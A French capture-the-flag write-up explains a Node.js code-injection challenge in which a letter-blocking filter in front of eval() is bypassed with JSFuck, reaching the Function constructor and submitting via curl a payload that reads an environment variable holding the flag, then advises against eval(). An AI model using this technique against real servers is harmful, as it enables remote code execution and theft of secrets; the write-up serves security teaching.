# Write-up — Défi 3 : SSTI "Sans Lettres"

**Catégorie** : Web / Programmation ésotérique (Node.js)  
**Niveau** : Difficile  
**Flag** : `CTF{n0l3tt3rssst1j5fuck}`  
**Commande de départ** : `curl http://<IP>:5002` ou navigateur

---

## Contexte

Le serveur Node.js évalue les expressions via `eval()`. Un filtre WAF bloque tout caractère alphabétique `[a-zA-Z]`. La faille : JavaScript peut exprimer n'importe quelle instruction en utilisant uniquement des symboles — technique connue sous le nom de **JSFuck**.

---

## Principe JSFuck

| Expression | Résultat |
|------------|----------|
| `![]` | `false` |
| `!![]` | `true` |
| `![] + []` | `"false"` |
| `!![] + []` | `"true"` |
| `{} + []` | `"[object Object]"` |

Extraction de caractères :
```javascript
(![] + [])[0]   // "f"
(![] + [])[1]   // "a"
(!![] + [])[0]  // "t"
({} + [])[5]    // "c"
```

---

## Étapes de résolution

### 1. Tester que eval() fonctionne

Soumettre : `!+[]+!+[]+!+[]` → réponse `3` ✅

### 2. Accéder au constructeur de Function

```javascript
[]['constructor']['constructor']('return 1+1')()  // → 2
```

### 3. Construire la payload complète

Encoder `return process.env.CTF_FLAG` via JSFuck (outil : https://jsfuck.com/) et soumettre via :

```bash
curl -X POST http://<IP>:5002/api/v1/render \
  -d "templateInput=<PAYLOAD_JSFUCK>"
```

Réponse : `{"output":"CTF{n0l3tt3rssst1j5fuck}"}`

---

## Vulnérabilité expliquée

`eval()` sur une entrée utilisateur est extrêmement dangereux même filtrée.

**Remédiation** : Ne jamais utiliser `eval()` sur des entrées utilisateur. Utiliser un sandbox réel.
